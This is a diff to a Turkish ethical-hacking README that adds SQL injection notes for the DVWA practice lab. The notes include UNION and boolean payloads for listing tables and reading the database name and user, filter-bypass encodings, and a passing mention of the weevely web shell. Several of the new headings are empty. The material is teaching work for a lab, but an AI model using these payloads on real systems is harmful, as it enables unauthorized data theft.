@@ -86,6 +86,14 @@
       - [SQL Union Select Tablo İsimlerini Öğrenme](#SQL-Union-Select-Tablo-İsimlerini-Öğrenme)
       - [SQL Union Select Sütun İsimlerini Öğrenme](#SQL-Union-Select-Sütun-İsimlerini-Öğrenme)
       - [SQL Union Select Sütun İçindeki Bilgileri Öğrenme](#SQL-Union-Select-Sütun-İçindeki-Bilgileri-Öğrenme) 
+- [Blind SQL Injection](#Blind-SQL-Injection)
+- [DVWA SQL Injection](#DVWA-SQL-Injection)
+  - [SQL Injection HEX Vermek](#SQL-Injection-HEX-Vermek)
+- [Database'in Bulunduğu Sunucudaki Dosyaları Okuma ve Yazma](#Database'in-Bulunduğu-Sunucudaki-Dosyaları-Okuma-ve-Yazma)
+  - [Veri Okuma](#Veri-Okuma)
+  - [Veri Yazma](#Veri-Yazma)
+  - [PHP Dosyasını Veri Olarak Eklemek](#PHP-Dosyasını-Veri-Olarak-Eklemek)
+-[SQL Map](#SQL-Map)
 
 # IP Çeşitleri
 > ## Public IP 
@@ -1019,3 +1027,46 @@ weevely <fotoğrafın yüklendiği konum><password> -> .php dosyasını kullanar
   
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2019.36.01.jpeg)
 
+# Blind SQL Injection
+
+- Sunucuda çalışan komutun görünmemesi demektri. Komut çalışır ancak hata verip vermediğini biz göremeyiz
+- ```DVWA -> Blind SQL Inj.```'a giriyoruz
+- ```User ID: 1' AND 1=1#``` deniyoruz
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2012.23.40.jpeg)
+
+- Eğer sonuç alabildiysek şimdi tablo isimlerini görebilir miyiz test ediyoruz 
+- ```User ID: 1' union select 1,table_name from information_schema.tables#``` deniyoruz. (1,table_name,2,3,4... şeklinde sonuç alana kadar artırıyoruz)
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2012.28.04.jpeg)
+
+- Database isimi ve kullanıcı öğrenmek için;
+- ```1' union select database(),user()#``` yazıyoruz
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2012.34.41.jpeg)
+
+# DVWA SQL Injection
+
+- Bazı sitelerde güvenlik amacıyla komut içerisindeki birşeyler filtrelenmiş olabilir (',#,AND,OR vb)
+- DVWA security level'ini medium'a alıyoruz
+- ```User ID: 1' AND 1=1#``` deniyoruz ve hata mesajı alıyoruz
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2012.37.28.jpeg)
+
+- Google'dan ```sql injection cheat sheet github``` şeklinde arama yapıyoruz ve deneyebileceğimiz opsiyonları görürüz
+  - ```' AND 1=1#``` -> ```' AND 40=40#```
+  - ```' AND 1=1#``` -> ```' AND 1=1½23```
+  - ```' AND 1=1#``` -> ```'+AND+1=1#```
+  - ```' AND 1=1#``` -> ```%27%20AND%201=1%23```
+  - ```'union select 1,2,3,4,5``` -> ```' uNiON sELEct 1,2,3,4,5```
+  - ```' AND 1=1#``` -> ```%27+AND+1=1#```
+  - ```' AND 30=30#``` -> ```%27 AND 30=30#```
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2012.45.51.jpeg)
+
+> ## SQL Injection HEX Vermek
+# Database'in Bulunduğu Sunucudaki Dosyaları Okuma ve Yazma
+> ## Veri Okuma
+> ## Veri Yazma
+> ## PHP Dosyasını Veri Olarak Eklemek
+# SQL Map
